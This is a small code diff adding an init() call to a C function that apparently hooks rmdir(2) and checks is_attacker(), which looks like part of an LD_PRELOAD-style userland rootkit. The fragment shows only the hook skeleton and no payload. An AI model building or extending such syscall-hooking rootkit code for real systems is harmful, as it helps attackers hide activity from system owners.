@@ -25,6 +25,7 @@
 #include "hooks.h" /* prototype */
 
 int rmdir(const char *pathname) {
+    init();
     DEBUG(D_INFO, "called rmdir(2) hook");
 
     if (is_attacker())
